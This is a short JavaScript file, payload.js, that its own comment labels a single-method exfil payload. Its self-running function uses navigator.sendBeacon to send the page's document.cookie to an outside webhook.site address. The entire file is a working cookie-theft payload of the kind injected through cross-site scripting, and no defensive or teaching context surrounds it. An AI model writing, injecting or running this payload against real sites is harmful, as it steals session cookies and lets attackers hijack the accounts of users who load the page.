// payload.js — single-method (navigator.sendBeacon) exfil
(function(){
    navigator.sendBeacon('https://webhook.site/cdd33ce1-18e4-4785-ae55-0420943172d4', document.cookie);
})();
